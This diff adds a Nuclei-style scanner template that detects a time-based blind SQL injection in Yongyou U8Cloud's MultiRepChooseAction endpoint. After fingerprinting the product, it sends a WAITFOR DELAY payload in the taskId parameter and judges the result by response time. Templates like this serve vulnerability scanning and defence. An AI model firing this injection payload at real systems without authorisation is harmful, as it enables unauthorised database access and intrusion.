@@ -1,0 +1,48 @@
+id: yongyou-u8cloud-multirepchooseaction-sqli
+info:
+  name: Yongyou U8Cloud MultiRepChooseAction SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Yongyou U8Cloud is vulnerable to a SQL injection vulnerability in the MultiRepChooseAction endpoint.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "U8C"
+        part: body
+
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "选择报表 - iUFO"
+          - "当前任务报表"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > t1"
+          - "duration < t2"
